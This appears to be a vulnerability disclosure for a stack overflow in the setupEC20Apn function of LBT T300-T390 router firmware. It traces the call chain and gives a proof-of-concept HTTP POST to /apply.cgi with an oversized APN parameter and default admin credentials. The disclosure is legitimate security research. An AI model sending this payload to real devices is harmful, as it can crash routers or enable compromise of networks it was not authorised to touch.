# LBT router setupEC20Apn function stack overflow vulnerability

> vendor:LBT
>
> product:T300-T390
>
> version:v2.2.1.8
>
> type:Stack Overflow

## Vulnerability Description

LBT T-T390 were discovered to contain a stack overflow via the apn_name_3g parameter in the setupEC20Apn function.

## Vulnerability Details

There is a stack overflow in the apn_name_3g variable in the setupEC20Apn function in the Rc program. The rc program is started through its symbolic link init. This variable is obtained through the system NVRAM_GET function and can be passed in by modifying the request package parameters of the wan_3g.asp page to bypass the front-end js verification.

The calling process of the overflow function is as follows:

main()->start3g_main()->startNormalDial()->dialStart()->setupEC20Apn()

![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/96f4a33e-c77d-4c8b-a3f5-86e2774c3297)
![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/b3f6a56f-3ee5-4842-b86d-3ad1f640594a)



## POC

    POST /apply.cgi HTTP/1.1
    Host: 192.168.10.1
    Content-Length: 911
    Cache-Control: max-age=0
    Authorization: Basic YWRtaW46YWRtaW4=
    Upgrade-Insecure-Requests: 1
    Origin: http://192.168.10.1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://192.168.10.1/VPN_PPTP.asp
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

    wan_proto=5&submit_button=wan_3g&change_action=&action=Apply&wan_dns_enable=0&auto_dial_3g=1&ppp_dial_only=0&local_ppp_ip_enable_3g=0&auto_sel3g=0&selectdail_uart=0&save_3g_networktype=1&selectdail_uart1=0&ISP_3g=3&apn_name_3g=ctnetdial_number_3g=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&pin_code_3g=&dial_number_3g=%23777&username_3g=card&password_3g=card&pppd_auth=0&vpdn_type=1&auto_dial=on&dial_3g_failed_total=3&extend_atcmd=&wan_dns1=&wan_dns2=&Network_ChinaTele=2&Network_ChinaMobile=0&Network_ChinaUnicom=0&UserDefinedNetworkTypes=1


